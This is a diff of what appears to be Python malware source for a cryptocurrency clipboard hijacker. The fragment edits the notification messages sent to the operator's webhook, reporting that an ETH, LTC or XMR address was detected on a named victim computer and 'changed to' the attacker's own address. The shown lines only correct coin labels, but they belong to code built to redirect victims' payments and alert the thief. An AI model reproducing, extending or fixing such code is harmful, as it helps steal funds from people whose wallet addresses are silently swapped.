@@ -99,11 +99,11 @@ def main():
                         if webhook_url != "":
                             if ping:
                                 message = {
-                                "content": f"@everyone```\ndetected BTC address on {comp_name} - changed to {ethaddr}\n```"
+                                "content": f"@everyone```\ndetected ETH address on {comp_name} - changed to {ethaddr}\n```"
                                 }
                             else:
                                 message = {
-                                    "content": f"```\ndetected BTC address on {comp_name} - changed to {ethaddr}\n```"
+                                    "content": f"```\ndetected ETH address on {comp_name} - changed to {ethaddr}\n```"
                                 }
 
                             json_data = json.dumps(message)
@@ -129,11 +129,11 @@ def main():
                         if webhook_url != "":
                             if ping:
                                 message = {
-                                "content": f"@everyone```\ndetected BTC address on {comp_name} - changed to {ltcaddr}\n```"
+                                "content": f"@everyone```\ndetected LTC address on {comp_name} - changed to {ltcaddr}\n```"
                                 }
                             else:
                                 message = {
-                                    "content": f"```\ndetected BTC address on {comp_name} - changed to {ltcaddr}\n```"
+                                    "content": f"```\ndetected LTC address on {comp_name} - changed to {ltcaddr}\n```"
                                 }
                             
                             json_data = json.dumps(message)
@@ -159,11 +159,11 @@ def main():
                         if webhook_url != "":
                             if ping:
                                 message = {
-                                "content": f"@everyone```\ndetected BTC address on {comp_name} - changed to {xmraddr}\n```"
+                                "content": f"@everyone```\ndetected XMR address on {comp_name} - changed to {xmraddr}\n```"
                                 }
                             else:
                                 message = {
-                                    "content": f"```\ndetected BTC address on {comp_name} - changed to {xmraddr}\n```"
+                                    "content": f"```\ndetected XMR address on {comp_name} - changed to {xmraddr}\n```"
                                 }
 
                             json_data = json.dumps(message)
